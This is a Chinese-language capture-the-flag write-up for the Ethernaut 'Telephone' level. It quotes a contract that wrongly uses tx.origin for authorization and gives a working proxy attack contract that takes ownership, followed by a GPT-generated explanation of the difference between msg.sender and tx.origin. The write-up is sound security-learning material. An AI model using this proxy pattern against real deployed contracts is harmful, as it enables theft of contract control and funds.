# 04-Telephone

日期: 16/08/2024
漏洞小结: 钓鱼攻击
简单明了: 通过代理合约导致交易发起人与函数调用人不匹配
难易: 简单

# 问题描述

Claim ownership of the contract below to complete this level.

```jsx
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```

# 攻击思路

非常简单明了，只要能够绕过if条件的限制，我们就可以自定义该合约的owner。

绕过限制的办法是实现`tx.origin != msg.sender`，那么要做到只需要用一个代理合约就行了。

这样整个交易的发起人其实是我的地址，但是调用这个函数的地址是攻击合约的地址

也就是说

- `tx.origin` = 我的地址
- `msg.sender` = 攻击合约的地址

这样只需要在调用的时候把需要变成owner地址放入函数变量即可。

# 攻击代码

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract AttackTelephone {
    address victim;

    constructor(address _victim){
        victim = _victim;
    }
    function Attack(address _newOwner) public {
        (bool success, ) = victim.call(abi.encodeWithSignature("changeOwner(address)", _newOwner));
        require(success,"Attack Failed!");
    }
}
```

- 上面使用call的语法不熟悉，**记一下**
- 其实`victim.call`就行，如果只是为了做题，不需要`success`，不过习惯还是好一些（费gas）

# 小白的思考

这道题目简单是因为之前在做Fallout的时候犯过错误，GPT帮我总结如下

### 回顾之前的情况

在那个 `Fal1out` 合约的挑战中，你的目标是通过调用 `Fal1out` 函数让自己成为合约的 `owner`。然而，当你用一个攻击合约来执行这一步时，结果发现 `owner` 变成了攻击合约的地址，而不是你自己的地址。这是因为 `msg.sender` 在这个上下文中是攻击合约的地址，而不是你自己。

### 详细分析

在你的攻击过程中：

1. 你通过攻击合约去调用目标合约的 `Fal1out` 函数。
2. 在目标合约中，`msg.sender` 是你的攻击合约的地址，而不是你的个人地址。
3. 如果目标合约的 `owner` 变量设置的是 `msg.sender`，那么 `owner` 就会变成攻击合约的地址。

### 类比 `tx.origin` 和 `msg.sender`

在这个场景下：

- `tx.origin` 始终是你个人的地址，因为你发起了整个交易。
- `msg.sender` 是你的攻击合约的地址，因为它是直接调用目标合约的实体。

虽然在 `Fal1out` 例子中并没有使用 `tx.origin`，但这个现象很好地展示了 `msg.sender` 和 `tx.origin` 之间的区别。`msg.sender` 是当前调用的直接来源，而 `tx.origin` 是整个调用链的起点。

### 解决方法

如果你想避免这个问题，可以直接从你的个人账户调用目标合约，而不是通过一个中间的攻击合约。这样 `msg.sender` 就会是你自己，从而正确地让你成为 `owner`。

### 总结

在审计过程中，理解 `msg.sender` 和 `tx.origin` 的区别非常重要，特别是在涉及身份验证和权限控制时，错误地使用这两个变量会引发漏洞。